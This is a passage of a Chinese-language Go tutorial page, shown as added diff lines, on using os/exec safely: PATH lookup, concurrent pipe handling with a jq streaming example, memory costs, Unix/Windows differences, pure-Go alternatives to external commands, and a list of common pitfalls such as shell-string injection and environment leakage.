+<p>关于 PATH 查找还有两个版本行为要记住。其一，<code>exec.Command</code> 只有在程序名<strong>不含路径分隔符</strong>时才调 <code>LookPath</code>；写成 <code>./tool</code> 就跳过查找，直接交给内核，此时它相对于 <code>Dir</code> 解析。其二，<strong>Go 1.19 起 <code>LookPath</code> 拒绝把程序名解析成当前目录下的相对路径</strong>（返回 <code>exec.ErrDot</code>），这是为了防止在不可信目录里被同名恶意程序劫持。真要执行当前目录下的东西，自己拼 <code>filepath.Abs</code>。服务启动时用 <code>exec.LookPath</code> 把所有依赖的外部命令预检一遍并 fail-fast，比等到线上第一个请求才发现镜像里没装 <code>ffmpeg</code> 要划算得多。</p>
+
+<h2>stdin 喂数据与大输出的内存账</h2>
+<p>需要向子进程流式写入、同时流式读出的场景（数据转换、压缩管道、按行处理日志），正确写法是<strong>三条流各有一个 goroutine</strong>，主 goroutine 只负责等它们全部结束再 <code>Wait</code>。</p>
+<pre><code class="language-go">// 流式过滤：stdin 喂数据，stdout 按行回调，stderr 只留尾部。
+func streamFilter(ctx context.Context, in io.Reader, onLine func(string)) error {
+    cmd := exec.CommandContext(ctx, "jq", "-c", ".items[]")
+    cmd.WaitDelay = 2 * time.Second
+
+    stdin, err := cmd.StdinPipe()
+    if err != nil {
+        return err
+    }
+    stdout, err := cmd.StdoutPipe()
+    if err != nil {
+        return err
+    }
+    stderr, err := cmd.StderrPipe()
+    if err != nil {
+        return err
+    }
+    if err := cmd.Start(); err != nil {
+        return err // 这里是 *exec.Error（找不到 jq），不是退出码
+    }
+
+    var g errgroup.Group
+    // 1) 喂 stdin：写完必须 Close，否则子进程一直等 EOF。
+    g.Go(func() error {
+        defer stdin.Close()
+        _, err := io.Copy(stdin, in)
+        if errors.Is(err, syscall.EPIPE) {
+            return nil // 子进程提前退出属正常，不当错误
+        }
+        return err
+    })
+    // 2) 读 stdout：必须与 stderr 并行，串行读就是经典死锁。
+    g.Go(func() error {
+        sc := bufio.NewScanner(stdout)
+        // 默认单行上限 64 KiB，超了报 token too long；按业务放大。
+        sc.Buffer(make([]byte, 0, 64&lt;&lt;10), 4&lt;&lt;20)
+        for sc.Scan() {
+            onLine(sc.Text())
+        }
+        return sc.Err()
+    })
+    // 3) 读 stderr：必须读到 EOF 把管道排空，只是把内容截断保留，
+    //    千万不要用 io.LimitReader 提前停读，那等于把子进程堵死。
+    var tail bytes.Buffer
+    g.Go(func() error {
+        _, err := io.Copy(&amp;limitedWriter{w: &amp;tail, n: 32 &lt;&lt; 10}, stderr)
+        return err
+    })
+
+    if err := g.Wait(); err != nil {
+        _ = cmd.Wait()
+        return err
+    }
+    // Wait 一定在所有管道读完之后调用，顺序反了会截断输出。
+    if err := cmd.Wait(); err != nil {
+        return fmt.Errorf("jq failed: %w (stderr: %s)", err, tail.String())
+    }
+    return nil
+}</code></pre>
+<p>内存这件事要算清楚：<code>Output</code> 和 <code>CombinedOutput</code> 把 stdout <strong>全量</strong>读进 <code>bytes.Buffer</code>，而 <code>bytes.Buffer</code> 扩容是成倍 <code>append</code>，峰值可以达到最终大小的两倍左右。子进程输出量不受你控制（比如 <code>git log</code> 全量、<code>find /</code>）时，用这两个函数就是在赌容器内存上限。要么改流式，要么把 <code>Stdout</code> 直接指向 <code>*os.File</code> 落盘——后者还有一个隐藏收益：writer 是 <code>*os.File</code> 时 exec 会把该 fd 直接给子进程，不创建管道、不起拷贝 goroutine，纯内核层转发。</p>
+
+<h2>跨平台差异与「干脆别调外部命令」</h2>
+<p>最后两个现实问题。第一个是 Windows：它的进程创建模型和类 Unix 根本不同，<code>CreateProcess</code> 最终只接受<strong>一整条命令行字符串</strong>，Go 会按 C 运行时的规则替你把 argv 数组转义拼接回去，目标程序再自己解析。这条链路上任何一环规则不一致，参数边界就会错位。</p>
+<table>
+<thead><tr><th>维度</th><th>类 Unix</th><th>Windows</th></tr></thead>
+<tbody>
+<tr><td>进程创建</td><td>clone/fork + <code>execve</code>，argv 是真数组</td><td><code>CreateProcess</code>，最终只有一条命令行字符串</td></tr>
+<tr><td>参数传递</td><td>内核按数组交付，无二次解析</td><td>Go 按 C 运行时规则转义，目标程序再解析一次</td></tr>
+<tr><td>批处理文件</td><td>无此概念</td><td><code>.bat</code>/<code>.cmd</code> 由 <code>cmd.exe</code> 二次解析，转义规则与 C 运行时不同，需要自己填 <code>SysProcAttr.CmdLine</code></td></tr>
+<tr><td>可执行判定</td><td>看权限位，不要求扩展名</td><td>依赖 <code>PATHEXT</code>，历史上还会优先搜当前目录</td></tr>
+<tr><td>终止进程树</td><td><code>Setpgid</code> + 负 PID 发信号</td><td>没有进程组信号，要用 Job Object，或退化成调 <code>taskkill</code> 带 /T /F</td></tr>
+<tr><td>信号语义</td><td>SIGTERM 优雅退出、SIGKILL 强杀</td><td>只有 <code>TerminateProcess</code>（等价强杀）；要发 Ctrl-Break 必须先设 <code>CREATE_NEW_PROCESS_GROUP</code></td></tr>
+<tr><td>环境变量</td><td>区分大小写</td><td>不区分大小写，去重规则也因此不同</td></tr>
+</tbody>
+</table>
+<p>第二个问题更根本：<strong>这个外部命令真的必须调吗？</strong> 每一次 exec 都是一次 fork（在大堆进程里复制页表并非零成本）、一次 <code>syscall.ForkLock</code> 串行化、一次二进制加载，还给你的部署加了一条隐式契约——目标机必须装有某个版本的某个命令。更麻烦的是你得解析人类可读的输出，而那个格式会随版本和 locale 漂移。</p>
+<table>
+<thead><tr><th>你想调的命令</th><th>纯 Go 替代</th><th>换掉的收益</th></tr></thead>
+<tbody>
+<tr><td><code>ls</code> / <code>find</code></td><td><code>os.ReadDir</code>、<code>filepath.WalkDir</code></td><td>不必解析输出，路径含空格与换行也不会出错</td></tr>
+<tr><td><code>curl</code> / <code>wget</code></td><td><code>net/http</code></td><td>超时、重试、连接复用、证书校验全部可控可观测</td></tr>
+<tr><td><code>tar</code> / <code>gzip</code></td><td><code>archive/tar</code> + <code>compress/gzip</code></td><td>流式处理，不落临时文件，不受 GNU/BSD tar 参数差异影响</td></tr>
+<tr><td><code>git</code>（读对象、遍历历史）</td><td>go-git，详见站内《用 Go 操作 Git 仓库：go-git 的能力与边界》</td><td>单二进制部署，目标机不需要装 git</td></tr>
+<tr><td><code>jq</code></td><td><code>encoding/json</code> + 结构体</td><td>类型安全，错误能定位到字段</td></tr>
+<tr><td><code>openssl</code></td><td><code>crypto/*</code></td><td>不再受系统 openssl 版本与 FIPS 策略牵制</td></tr>
+<tr><td><code>sed</code> / <code>awk</code></td><td><code>bufio</code> + <code>strings</code> / <code>regexp</code></td><td>行为不随 locale 和 GNU/BSD 实现漂移</td></tr>
+<tr><td><code>ps</code> / <code>netstat</code></td><td>直接读 <code>/proc</code>（Linux）</td><td>字段稳定，不用对着列宽做切分</td></tr>
+</tbody>
+</table>
+<p>反过来说，<code>ffmpeg</code>、<code>pandoc</code>、<code>LaTeX</code> 这类本身就是一整套复杂实现的工具，没必要也不可能用 Go 重写，该调就调——但要用上面那套封装：数组传参、进程组隔离、超时与宽限期、输出限长、退出码分类。</p>
+
+<div class="callout callout-danger">
+    <div class="callout-icon">❌</div>
+    <div class="callout-title">最容易踩的坑</div>
+    <p>以下每一条我都在线上见过：</p>
+    <ul>
+    <li><strong>用 <code>sh -c</code> 拼字符串</strong>：一旦有拼接就有注入，加引号和过滤分号都挡不住。必须用 shell 时脚本文本写死，数据走环境变量或位置参数。</li>
+    <li><strong>用户可控参数以连字符开头</strong>：即使不经 shell，也会被目标程序当成选项。用户数据前加 <code>--</code> 分隔，或校验首字符。</li>
+    <li><strong>串行读 StdoutPipe 和 StderrPipe</strong>：其中一路超过内核管道缓冲（Linux 默认 64 KiB）就双向死锁。两个管道必须两个 goroutine 并行读。</li>
+    <li><strong>先 <code>Wait</code> 再读管道</strong>：<code>Wait</code> 会关掉管道，表现为「输出莫名被截断」。顺序只能是读完再 Wait。</li>
+    <li><strong><code>Start</code> 之后忘了 <code>Wait</code></strong>：子进程退出后变僵尸占着 PID 和管道 fd，长跑服务最终 fork 失败。<code>Wait</code> 还只能调一次。</li>
+    <li><strong>以为 <code>CommandContext</code> 会杀掉整棵进程树</strong>：默认只杀直接子进程。要 <code>Setpgid</code> + 自定义 <code>Cancel</code> 用负 PID 发信号。</li>
+    <li><strong>把 <code>WaitDelay</code> 当执行超时</strong>：它只是取消后的 I/O 收尾宽限期，不设 context 命令能跑到永远。</li>
+    <li><strong>设了 <code>Env</code> 却忘了 <code>PATH</code></strong>：<code>Env</code> 是完整替换不是追加，子进程内部再 exec 就会失败。想继承再改用 <code>cmd.Environ()</code>。</li>
+    <li><strong>让 <code>Env</code> 保持 nil</strong>：凭据类环境变量整份交给子进程，是很典型的横向泄漏路径。</li>
+    <li><strong>把 <code>ExitCode()</code> 返回的 -1 当业务退出码</strong>：那代表进程是被信号打死的，真实信号在 <code>WaitStatus</code> 里。</li>
+    <li><strong>把非零退出一律当故障</strong>：<code>grep</code> 无匹配返回 1、<code>diff</code> 有差异返回 1 都是正常语义，要按命令约定解释。</li>
+    <li><strong>对不受控的大输出用 <code>Output</code></strong>：全量进 <code>bytes.Buffer</code>，扩容峰值约两倍，直接把容器 OOM 掉。改流式或直接落盘。</li>
+    <li><strong>指望 <code>ExitError.Stderr</code> 里有内容</strong>：只有 <code>Output</code> 会填这个字段，<code>Run</code> 和 <code>CombinedOutput</code> 都不会。</li>
+    <li><strong>Windows 上直接调 <code>.bat</code> 并依赖 Go 的转义</strong>：<code>cmd.exe</code> 会用另一套规则重新解析，参数边界会错位，必须自己填 <code>SysProcAttr.CmdLine</code>。</li>
+    </ul>
+</div>
+                    </div>
+                </article>
+
+                <nav class="article-nav">
+<a class="nav-prev" href="../iris/"><span class="nav-label">← 上一篇</span><span class="nav-title">Iris</span></a>
+<a class="nav-next" href="../io/"><span class="nav-label">下一篇 →</span><span class="nav-title">IO</span></a>
+                </nav>
+                <aside class="related-card"><h2 class="related-title">同组阅读 · 后端与编程语言</h2><ul class="related-list"><li><a class="side-post" href="../">Go 语言总览</a></li><li><a class="side-post" href="../codegen/">Stringer</a></li><li><a class="side-post" href="../echo/">Echo</a></li><li><a class="side-post" href="../context/">Context</a></li><li><a class="side-post" href="../regexp/">regexp 包</a></li><li><a class="side-post" href="../sort/">Sort</a></li><li><a class="side-post" href="../image-text/">FreeType</a></li><li><a class="side-post" href="../iris/">Iris</a></li><li><a class="side-post" href="../io/">IO</a></li><li><a class="side-post" href="../concurrency/">代码片段</a></li><li><a class="side-post" href="../collections/">切片分组</a></li><li><a class="side-post" href="../slog/">Log</a></li><li><a class="side-post" href="../generics/">泛型基础</a></li><li><a class="side-post" href="../gin/">Gin</a></li><li><a class="side-post" href="../modules/">常用包</a></li><li><a class="side-post" href="../go-git/">go-git</a></li><li><a class="side-post" href="../generics-usage/">Go 泛型进阶（1.18-1.27）</a></li></ul></aside>
+
+                <div class="share-bar">
+                    <span class="share-label">分享：</span>
+                    <button class="share-btn" data-platform="copy" title="复制链接">🔗</button>
+                    <button class="share-btn" data-platform="twitter" title="分享到 X/Twitter">𝕏</button>
+                    <button class="share-btn" data-platform="weibo" title="分享到微博">📱</button>
+                    <button class="share-btn" data-platform="email" title="邮件分享">✉️</button>
+                </div>
+            </main>
+        </div>
+    </div>
+
+    <footer class="site-footer">
+        <div class="footer-links">
+            <a href="../../../feed.xml" title="RSS 订阅">
+                <svg viewBox="0 0 24 24"><path d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
+                RSS 订阅
+            </a>
+            <a href="../../../atom.xml" title="Atom 订阅">Atom</a>
+            <a href="../../../sitemap.xml" title="网站地图">Sitemap</a>
+        </div>
+    </footer>
+
+    <button class="back-to-top" title="回到顶部">↑</button>
+
+        <script defer src="../../../vendor/highlight.min.js"></script>
+
+    
+    <script>window.SITE_BASE = "../../../";window.SITE_GROUP = "programming";</script>
+    <script src="../../../js/main.js?v=2" defer></script>
+</body>
+</html>
